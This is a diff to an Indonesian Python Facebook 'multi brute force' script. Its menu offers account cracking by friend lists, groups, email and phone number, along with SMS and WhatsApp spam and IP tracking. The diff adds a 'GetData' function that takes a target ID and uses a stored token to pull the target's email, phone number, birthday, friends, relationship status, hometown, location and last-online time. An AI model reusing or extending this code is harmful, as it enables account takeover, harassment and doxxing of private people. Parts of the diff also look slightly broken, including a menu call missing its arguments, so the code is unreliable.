@@ -993,7 +993,7 @@ def menu(my_name,my_id):
 	ip = requests.get("https://api.ipify.org").text
 	cetak(panel(f'[bold cyan]Terima Kasih Kepada [bold green]Xyzon Dev[bold cyan] Yang Telah Membuat Script Ini [bold yellow]Xyzon Multi Brute Force',width=90,style=f"bold red"))
 	cetak(panel(f'[bold white][[bold green]•[/][bold white]][/] [bold cyan]Username : [bold yellow]{my_name}[/]\n[bold white][[bold green]•[/][bold white]][/] [bold cyan]User Idz : [bold yellow]{my_id}[/]\n[bold white][[bold green]•[/][bold white]][/] [bold cyan]User Ip  : [bold yellow]{ip}[/][/][bold white]\n[bold white][[bold green]•[/][bold white]][/] [bold cyan]Tanggal  : [bold yellow]{tgl} {bln} {thn}[/][/][bold white]\n[[bold green]•[/][bold white]][/] [bold cyan]Status   : [bold green]Premium ',width=90,title=f"[bold red][[bold green] {Definisi__Waktu()} [bold red]]",style=f"bold red"))
-	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/]. [bold cyan]Crack ID From Pubilc Friends [bold white][[bold green] ON [bold white]][/]\n[bold white][[bold green]02[/][bold white]][/]. [bold cyan]Crack ID From Random Massal [bold white][[bold green] ON [bold white]][/]\n[bold white][[bold green]03[/][bold white]][/]. [bold cyan]Crack ID From Username [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]04[/][bold white]][/]. [bold cyan]Crack ID From Member Grup [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]05[/][bold white]][/]. [bold cyan]Crack ID From Total Followers [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]06[/][bold white]][/]. [bold cyan]Crack ID From Email Target [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]07[/][bold white]][/]. [bold cyan]Crack ID From File Kita [bold white][[bold green] ON [bold white]][/]\n[bold white][[bold green]08[/][bold white]][/]. [bold cyan]Crack ID From Nomor Target [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]09[/][bold white]][/]. [bold cyan]Crack ID From Komen Target [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]10[/][bold white]][/]. [bold cyan]Check Hasil Crack [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]11[/][bold white]][/]. [bold cyan]Chekpoint Detector [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]12[/][bold white]][/]. [bold cyan]Get Headers [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]13[/][bold white]][/]. [bold cyan]Lacak IP Target [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]14[/][bold white]][/]. [bold cyan]Spam Sms Target [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]15[/][bold white]][/]. [bold cyan]Spam WhatsApp Target [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]16[/][bold white]][/]. [bold cyan]Bot Komen Facebook [bold white][[bold green] ON [bold white]][bold white]\n[[bold green]17[/][bold white]][/]. [bold cyan]Ingfo Author [bold yellow]XMBF [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]18[/][bold white]][/]. [bold cyan]Report Bug Script [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]RM[/][bold white]][/]. [bold cyan]Remove Data Login [bold white][[bold green] ON [bold white]][/]\n[bold white][[bold red]00[/][bold white]][/]. [bold red]Keluar Script [bold white][[bold green] ON [bold white]][/]',width=90,title=f"[bold red][[bold green] List Menu [bold red]]",style=f"bold red"))
+	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/]. [bold cyan]Crack ID From Pubilc Friends [bold white][[bold green] ON [bold white]][/]\n[bold white][[bold green]02[/][bold white]][/]. [bold cyan]Crack ID From Random Massal [bold white][[bold green] ON [bold white]][/]\n[bold white][[bold green]03[/][bold white]][/]. [bold cyan]Crack ID From Username [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]04[/][bold white]][/]. [bold cyan]Crack ID From Member Grup [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]05[/][bold white]][/]. [bold cyan]Crack ID From Total Followers [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]06[/][bold white]][/]. [bold cyan]Crack ID From Email Target [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]07[/][bold white]][/]. [bold cyan]Crack ID From File Kita [bold white][[bold green] ON [bold white]][/]\n[bold white][[bold green]08[/][bold white]][/]. [bold cyan]Crack ID From Nomor Target [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]09[/][bold white]][/]. [bold cyan]Crack ID From Komen Target [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]10[/][bold white]][/]. [bold cyan]Check Hasil Crack [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]11[/][bold white]][/]. [bold cyan]Chekpoint Detector [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]12[/][bold white]][/]. [bold cyan]Get Headers [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]13[/][bold white]][/]. [bold cyan]Lacak IP Target [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]14[/][bold white]][/]. [bold cyan]Spam Sms Target [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]15[/][bold white]][/]. [bold cyan]Spam WhatsApp Target [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]16[/][bold white]][/]. [bold cyan]Bot Komen Facebook [bold white][[bold green] ON [bold white]][bold white]\[bold white][[bold green]17[/][bold white]][/]. [bold cyan]Get Data Pengguna [bold green]Lain [bold white][[bold green] ON [bold white]][/]\n[[bold green]18[/][bold white]][/]. [bold cyan]Ingfo Author [bold yellow]XMBF [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]19[/][bold white]][/]. [bold cyan]Report Bug Script [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]RM[/][bold white]][/]. [bold cyan]Remove Data Login [bold white][[bold green] ON [bold white]][/]\n[bold white][[bold red]00[/][bold white]][/]. [bold red]Keluar Script [bold white][[bold green] ON [bold white]][/]',width=90,title=f"[bold red][[bold green] List Menu [bold red]]",style=f"bold red"))
 	cetak(panel(f'    [bold Red]Warning[bold cyan] Gunakan Script Ini Dengan Baik Jangan Di Salah Gunakan [bold green]By Xyzon Dev',width=90,title=f"[bold red][[bold green] Informasi Crack [bold red]]",style=f"bold red"))
 	_____xyzon___xd____ = input(f' {P}[{H}+{P}] \33[1;96mPilih Menu Crack \x1b[1;91m> {P}')
 	if _____xyzon___xd____ in ['1','01']:
@@ -1029,8 +1029,10 @@ def menu(my_name,my_id):
 	elif _____xyzon___xd____ in('16','016'):
 		memeklovekontolmekarid()
 	elif _____xyzon___xd____ in('17','017'):
-		info_ngentod()
+		GetData()
 	elif _____xyzon___xd____ in('18','018'):
+		info_ngentod()
+	elif _____xyzon___xd____ in('19','019'):
 		cetak(panel(f"[bold cyan]Apapun Bug Pada Script Tolong Laporkan Kepada Saya Agar Bisa Mengembangkan Sc Ini Semakin Dikit Bugnya Semakin Baik Sc Ini , Anda Akan Di Arahkan Ke WhatsApp",width=90,title=f"[bold red][[bold green] Report Bug [bold red]]",style=f"bold red"))
 		os.system("xdg-open https://wa.me/+6282183929059?text=Asalammualikum+Bang+Saya+Mau+Melaporkan+Bug+Pada+Sc+Mu+Bang")
 		time.sleep(3)
@@ -2620,6 +2622,164 @@ def cek_apk(kuki):
 			print ("\r%s  \033[0m              ➛ %s"%(P,M,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
 	except AttributeError:
 		print ("\r    %s \033[0mcookie invalid"%(M))
+#AMBIL DATA ORANG
+def GetData():
+    try:
+        cookie = open(".cookie.txt","r").read()
+    except IOError:
+        jalan(balmond+m+" cookie Kadaluarsa")
+        time.sleep(0.5)
+        login()
+    try:
+        user = input ( "\033[0;35mʕ\x1b[1;91m ×\x1b[1;95m_\x1b[1;91m×\x1b[1;95mʔ\033[0;00m Id Target : ")
+        if user == '':
+            print ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Masukan dengan benar bro");GetData()
+#        url = ("https://lookup-id.com/")
+#        if user == "facebook":
+#            payload = {"fburl": user, "check": "Lookup"}
+#        else:
+#            payload = {"fburl": "https://free.facebook.com/" + user, "check": "Lookup"}
+#        halaman = requests.post(url, data = payload).text
+#        sop_ = BeautifulSoup(halaman, "html.parser")
+#        email_ = user
+        idt = user
+        if user == "me":
+            idt = "me"
+        cintaku = requests.get('https://graph.facebook.com/'+idt+'?access_token='+token)
+        x = json.loads(cintaku.text)
+        nmaa = x['name']
+    except (KeyError,IOError):
+        nmaa = ('-')
+    print ('\x1b[1;91m──────────────────────────────────────────────────────────────')
+    print (' \x1b[1;96m  Informasi Akun ');time.sleep(0.03)
+    print ('\n \033[0;35mʕ\x1b[1;91m ×\x1b[1;95m_\x1b[1;91m×\x1b[1;95mʔ\x1b[1;97m nama lengkap : '+nmaa);time.sleep(0.03)
+    try:
+        ndpn = x['first_name']
+    except (KeyError,IOError):
+        ndpn = ('-')
+    print (' \033[0;35mʕ\x1b[1;91m ×\x1b[1;95m_\x1b[1;91m×\x1b[1;95mʔ\x1b[1;97m nama depan   : %s'%ndpn);time.sleep(0.03)
+    try:
+        nmbl = x['last_name']
+    except (KeyError,IOError):
+        nmbl = '-'
+    print (' \033[0;35mʕ\x1b[1;91m ×\x1b[1;95m_\x1b[1;91m×\x1b[1;95mʔ\x1b[1;97m nama belakang: %s'%nmbl);time.sleep(0.03)
+    try:
+        hwhs = x['username']
+    except (KeyError,IOError):
+        hwhs = '-'
+    print (' \033[0;35mʕ\x1b[1;91m ×\x1b[1;95m_\x1b[1;91m×\x1b[1;95mʔ\x1b[1;97m username fb  : '+hwhs);time.sleep(0.03)
+    try:
+        ___xxz___jeeck___ = x['id']
+    except (KeyError,IOError):
+        ___xxz___jeeck___ = '?'
+    print (' \033[0;35mʕ\x1b[1;91m ×\x1b[1;95m_\x1b[1;91m×\x1b[1;95mʔ\x1b[1;97m id facebook  : %s'%___xxz___jeeck___);time.sleep(0.03)
+    print ('\x1b[1;91m──────────────────────────────────────────────────────────────')
+    print ('\x1b[1;96m   Data-Data Akun  \n');time.sleep(0.03)
+    try:
+        emai = x['email']
+    except (KeyError,IOError):
+        emai = '-'
+    print (' \033[0;35mʕ\x1b[1;91m ×\x1b[1;95m_\x1b[1;91m×\x1b[1;95mʔ\x1b[1;97m gmail facebook : %s'%emai);time.sleep(0.03)
+    try:
+        nmrr = x['mobile_phone']
+    except (KeyError,IOError):
+        nmrr = '-'
+    print (' \033[0;35mʕ\x1b[1;91m ×\x1b[1;95m_\x1b[1;91m×\x1b[1;95mʔ\x1b[1;97m nomor telepon  : %s'%nmrr);time.sleep(0.03)
+    try:
+        ttll = x['birthday']
+    except (KeyError,IOError,NameError):
+        ttll = '-/-/-'
+    print (' \033[0;35mʕ\x1b[1;91m ×\x1b[1;95m_\x1b[1;91m×\x1b[1;95mʔ\x1b[1;97m tanggal lahir  : %s '%ttll);time.sleep(0.03)
+    try:
+        jenis = x['gender'].replace("female","Betina").replace("male","Jantan")
+    except (KeyError,IOError):
+        jenis = '-'
+    print (' \033[0;35mʕ\x1b[1;91m ×\x1b[1;95m_\x1b[1;91m×\x1b[1;95mʔ\x1b[1;97m jenis kelamin  : %s '%jenis)
+    try:
+        r = requests.get('https://graph.facebook.com/'+idt+'/friends?limit=10000&access_token='+token)
+        z = json.loads(r.text)
+        for i in z["data"]:
+            try:
+               jamet = i["id"]
+               id.append(jamet)
+            except:
+               continue
+    except:
+        pass
+    print (' \033[0;35mʕ\x1b[1;91m ×\x1b[1;95m_\x1b[1;91m×\x1b[1;95mʔ\x1b[1;97m Total pertemnan: %s'%(len(id)))
+    try:
+        b = requests.get('https://graph.facebook.com/'+idt+'/subscribers?access_token='+token)
+        A = json.loads(b.text)
+        pengikut = A["summary"]["total_count"]
+    except (KeyError, IOError):
+        pengikut = '-'
+    print (' \033[0;35mʕ\x1b[1;91m ×\x1b[1;95m_\x1b[1;91m×\x1b[1;95mʔ\x1b[1;97m Total pengikut : %s'%pengikut)
+    try:
+        lins = x['link']
+    except (KeyError,IOError):
+        lins = '-'
+    print (' \033[0;35mʕ\x1b[1;91m ×\x1b[1;95m_\x1b[1;91m×\x1b[1;95mʔ\x1b[1;97m link facebook  : %s'%lins);time.sleep(0.03)
+    try:
+        stas = x['relationship_status']
+    except (TypeError,KeyError,IOError):
+        stas = '-'
+    try:
+        dgn = x['significant_other']['name']
+    except (TypeError,KeyError,IOError):
+        dgn = '-'
+    except:
+        pass
+    print (' \033[0;35mʕ\x1b[1;91m ×\x1b[1;95m_\x1b[1;91m×\x1b[1;95mʔ\x1b[1;97m status hubungan: '+stas+' dengan '+dgn);time.sleep(0.03)
+    try:
+        bioo = x['about']
+    except (KeyError,IOError):
+        bioo = '-'
+    except:
+        pass
+    print (' \033[0;35mʕ\x1b[1;91m ×\x1b[1;95m_\x1b[1;91m×\x1b[1;95mʔ\x1b[1;97m tentang status : %s'%bioo);time.sleep(0.03)
+    try:
+        dari = x['hometown']['name']
+    except (KeyError,IOError):
+        dari = '-'
+    except:
+        pass
+    print (' \033[0;35mʕ\x1b[1;91m ×\x1b[1;95m_\x1b[1;91m×\x1b[1;95mʔ\x1b[1;97m kota asal      : %s'%dari)
+    try:
+        tigl = x['location']['name']
+    except (KeyError,IOError):
+        tigl = '-'
+    except:
+        pass
+    print (' \033[0;35mʕ\x1b[1;91m ×\x1b[1;95m_\x1b[1;91m×\x1b[1;95mʔ\x1b[1;97m tinggal di     : %s'%tigl)
+    try:
+        lopeDela = x["location"]["id"]
+    except (KeyError,IOError):
+        lopeDela = '-'
+    except:
+        pass
+    print (' \033[0;35mʕ\x1b[1;91m ×\x1b[1;95m_\x1b[1;91m×\x1b[1;95mʔ\x1b[1;97m id lokasi      : %s'%lopeDela)
+    try:
+        tzim = x['timezone']
+    except (KeyError,IOError):
+        tzim = '-'
+    except:
+        pass
+    print (' \033[0;35mʕ\x1b[1;91m ×\x1b[1;95m_\x1b[1;91m×\x1b[1;95mʔ\x1b[1;97m zona waktu     : %s'%tzim);time.sleep(0.03)
+    try:
+        jam  = x['updated_time'][11:19]
+        uptd = x['updated_time'][:10]
+        year, month, day = uptd.split("-")
+        month = bulan_ttl[month]
+    except (KeyError,IOError):
+        year = '-'
+        month = '-'
+        day = '-'
+    except:
+        pass
+    print (" \033[0;35mʕ\x1b[1;91m ×\x1b[1;95m_\x1b[1;91m×\x1b[1;95mʔ Terakhir Online Tanggal \x1b[1;97m"+uptd+"\x1b[1;95m Jam \x1b[1;97m"+jam)
+    print ('\x1b[1;97m──────────────────────────────────────────────────────────────')
+    input('\n\x1b[1;95m  [ \x1b[1;97mKEMBALI \x1b[1;95m] ')
+    menu()
 
 #-----------------------[ DEF CEK OPSI ]--------------------#
 import requests, shutil, os, re, bs4, sys, json, time, platform ,random, datetime, subprocess, logging, base64
